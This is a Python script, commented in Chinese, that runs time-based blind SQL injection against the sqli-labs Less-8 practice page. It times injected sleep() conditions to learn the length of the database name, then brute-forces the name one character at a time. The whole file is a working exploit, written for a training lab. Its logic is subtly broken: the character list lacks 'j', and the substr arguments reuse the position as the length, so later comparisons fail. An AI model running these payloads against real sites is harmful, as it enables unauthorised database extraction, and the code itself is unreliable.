import urllib.parse
import urllib.request
from time import time


"""
python3 time base 注入脚本实例
id 选项可以进行时间盲注

注意 时间盲注的脚本可以有多种，可以逐个判断也可以一次请求直接判断
"""

# URL 只有get请求 id表示参数 parameter 表示这个参数的内容
def do_it(parameter):

    URL = r'''http://192.168.156.8/sqli-labs/Less-8/'''
    payload = {'id':parameter}
    Send = urllib.parse.urlencode(payload)
    #print(parameter)
    req = urllib.request.Request(URL+'?'+ Send)
    #req.add_header('cookie','xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    start = time()
    response = urllib.request.urlopen(req)
    end = time()
    return (end-start)

## 时间注入获得长度
payload1 = "1' and if((select length(database()))={length},sleep(1),0)#"
length = 0
for i in range(1,99):
    if(do_it( payload1.format(length=str(i)))>0.99):    
        length = i
        break
print("length is " + str(length))

## 暴力枚举，当然也可以使用其他的快速算法
word_list = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'    #匹配用的字符串
payload2 = "1'AND if(ascii(substr((select database()),{num},{num}))={test},sleep(1),0) ##"

for i in range(1,length+1):
    for j in word_list:
        if(do_it( payload2.format(num=str(i),test = str(ord(j))))>0.99):
            print(j)
            break

